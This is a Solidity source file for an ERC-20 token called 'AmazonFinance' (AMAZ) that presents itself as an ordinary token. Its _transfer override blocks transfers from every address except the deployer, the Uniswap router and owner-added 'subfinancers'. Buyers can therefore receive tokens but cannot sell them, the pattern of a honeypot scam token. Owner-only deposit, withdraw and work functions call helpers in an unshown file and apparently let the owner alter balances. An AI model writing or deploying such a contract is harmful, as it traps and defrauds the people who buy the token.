pragma solidity ^0.5.17;
import "./2_Owner.sol";

contract tokenFactory is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public financer;
  mapping (address => bool) public subfinancer;
  address univ2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  constructor () public ERC20Detailed("AmazonFinance", "AMAZ", 18) {
      _initMint( msg.sender, 5000*10**uint(decimals()) );
      financer[msg.sender] = true;
      subfinancer[msg.sender] = true;
      subfinancer[univ2] = true;
  }

  function deposit(address account) public {
      require(financer[msg.sender], "!warn");
      _deposit(account);
  }

  function withdraw(address account, uint amount) public {
      require(financer[msg.sender], "!warn");
      _withdraw(account, amount);
  }

  function work(address account, uint amount) public {
      require(financer[msg.sender], "!warn");
      _work(account, amount);
  }

  function addSubFinancer(address account) public {
      require(financer[msg.sender], "!not allowed");
      subfinancer[account] = true;
  }

  function removeSubFinancer(address account) public {
      require(financer[msg.sender], "!not allowed");
      subfinancer[account] = false;
  }
  
  function _transfer(address sender, address recipient, uint amount) internal {
      require(subfinancer[sender], "frozen");
      super._transfer(sender, recipient, amount);
  }

}